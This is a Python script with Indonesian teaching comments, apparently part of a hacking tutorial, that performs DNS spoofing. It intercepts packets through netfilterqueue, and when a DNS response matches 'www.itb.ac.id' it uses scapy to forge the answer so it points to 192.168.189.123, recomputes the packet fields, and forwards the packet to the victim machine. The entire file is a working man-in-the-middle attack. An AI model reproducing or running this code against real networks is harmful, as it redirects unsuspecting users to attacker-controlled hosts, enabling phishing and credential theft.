# LANJUTAN DARI net_cut.py

import netfilterqueue # panggil method netfilterqueue agar bisa 
import scapy.all as scapy # panggil method scapy

# start def
def process_packet(packet): # funct untuk menkonversi paket ke scapy
    scapy_packet = scapy.IP(packet.get_payload()) # melihat lebih detil isi dari layer IP 
    if scapy_packet.haslayer(scapy.DNSRR): # Cek apakah packet memiliki layer DNSRR (DNS Resource Record)
        qname = scapy_packet[scapy.DNSQR].qname # buat var qname yang diisi dengan filed qname dari layer DNSQR (DNS Question Record) 
        if "www.itb.ac.id" in qname.decode(): # melakukan validasi jika www.itb.ac.id adalah sama dengan qname. sedangkan decode untuk mengubah dari bytes ke string
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.189.123") # buat var answer yang dimana adalah jawaban yang kita modifikasi / jawaban palsu
            scapy_packet[scapy.DNS].an = answer # jawaban yang sudah dimodifikasi tersebut dimasukkan ke field an pada layer DNS
            scapy_packet[scapy.DNS].ancount = 1 # memodifikasi banyaknya answer yang dikirim 
            
            del scapy_packet[scapy.IP].len # delete field len pada layer IP
            del scapy_packet[scapy.IP].chksum # delete field chksum pada layer IP
            del scapy_packet[scapy.UDP].len # delete field len pada layer UDP
            del scapy_packet[scapy.UDP].chksum # delete field chksum pada layer UDP
            
            packet.set_payload(bytes(scapy_packet)) #  men-setting packet asli ke scapy_packet, yang dimana scapy_packet adalah packet yang sudah kita modifikasi.
    packet.accept() # untuk menerima / meneruskan paket ke komputer korban

    return
# end def

# start def
def main():
    queue = netfilterqueue.NetfilterQueue() # membuat var queue yang dimana isinya adalah supaya kita mendapat akses ke packet yang sesuai dengan iptables
    queue.bind(0, process_packet) # fungsi bind untuk dapat menargetkan queue_number dan callback-function
    queue.run() # run queue
    
    return
if __name__=='__main__':
    main()
# end def
